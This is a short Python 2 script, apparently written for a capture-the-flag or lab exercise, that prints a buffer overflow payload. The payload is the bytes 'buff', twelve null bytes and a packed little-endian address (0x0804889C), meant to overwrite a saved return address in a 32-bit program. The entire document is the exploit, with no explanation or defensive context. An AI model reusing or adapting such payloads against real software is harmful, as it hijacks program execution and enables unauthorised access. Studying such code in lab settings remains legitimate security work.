#!/usr/bin/python


from struct import pack


if __name__ == '__main__':

    print "buff"+"\x00"*12 + pack("<I", 0x0804889C) #"\x08\x04\x88\x9C"
